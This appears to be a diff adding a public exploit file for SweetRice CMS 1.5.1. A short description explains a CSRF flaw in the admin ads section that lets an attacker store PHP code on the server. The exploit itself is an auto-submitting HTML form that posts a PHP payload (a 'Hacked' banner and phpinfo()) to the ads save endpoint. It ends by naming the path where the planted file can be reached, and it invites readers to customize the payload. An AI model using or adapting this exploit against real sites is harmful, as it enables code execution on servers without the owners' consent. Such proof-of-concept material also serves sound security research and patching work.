@@ -1,0 +1,39 @@
+<!--
+# Exploit Title: SweetRice 1.5.1 Arbitrary Code Execution
+# Date: 30-11-2016
+# Exploit Author: Ashiyane Digital Security Team
+# Vendor Homepage: http://www.basic-cms.org/
+# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
+# Version: 1.5.1
+
+
+# Description :
+
+# In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
+PHP Codes In Ads File
+# A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute
+PHP Codes On Server .
+# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; phpinfo(); 
+Code You Can
+Customize Exploit For Your Self .
+
+# Exploit :
+-->
+
+<html>
+<body onload="document.exploit.submit();">
+<form action="http://localhost/sweetrice/as/?type=ad&mode=save" method="POST" name="exploit">
+<input type="hidden" name="adk" value="hacked"/>
+<textarea type="hidden" name="adv">
+<?php
+echo '<h1> Hacked </h1>';
+phpinfo();?>
+&lt;/textarea&gt;
+</form>
+</body>
+</html>
+
+<!--
+# After HTML File Executed You Can Access Page In
+http://localhost/sweetrice/inc/ads/hacked.php
+  -->
